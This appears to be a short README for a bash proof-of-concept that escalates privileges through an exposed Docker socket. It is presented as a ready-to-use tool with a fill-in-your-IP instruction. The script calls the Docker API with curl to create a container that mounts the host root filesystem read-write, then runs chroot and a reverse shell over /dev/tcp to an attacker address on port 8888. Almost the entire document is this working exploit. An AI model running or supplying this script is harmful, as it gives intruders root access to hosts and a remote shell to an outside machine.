# Docker.sock-environment-takeover
![](https://)

/var/run/docker.sock could lead to full environment takeover. (Privilege Escalation)

I've written a bash script to automate things written in this article. 

##Proof of Concept

`#!/bin/bash`
`pay="bash -c 'bash -i >& /dev/tcp/<Attacker-ipaddr>/8888 0>&1'"`
`payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$pay\\\"\"]"`
`response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"sandbox\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)`
`revShellContainerID=$(echo "$response" | cut -d'"' -f4)`
`curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start`
`sleep 1`
`curl --output - -s --unix-socket /var/run/docker.sock "http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1"`

##Add the attacker ip address to above bash script and start a listener on attacker machine on port 8888. Check the screenshots if you don't understand.

![](https://)
![](https://)


##References
https://dejandayoff.com/the-danger-of-exposing-docker.sock/
